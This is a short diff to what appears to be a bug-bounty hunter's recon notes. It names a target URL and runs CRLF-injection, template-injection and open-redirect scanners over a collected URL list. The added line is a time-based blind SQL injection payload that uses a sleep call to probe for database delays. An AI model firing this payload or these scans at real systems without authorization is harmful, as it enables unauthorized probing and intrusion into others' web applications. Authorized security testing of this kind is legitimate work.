@@ -1,5 +1,8 @@
 https://h1.security.nathan.sx/
 
+0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z
+
+
 crlfi -i /home/lipon/Hacking/recon/urls.txt -o crlf.txt
 ssti -l /home/lipon/Hacking/recon/urls.txt -o ssti.txt
 RedirectHunter -l /home/lipon/Hacking/recon/urls.txt -o redirect.txt
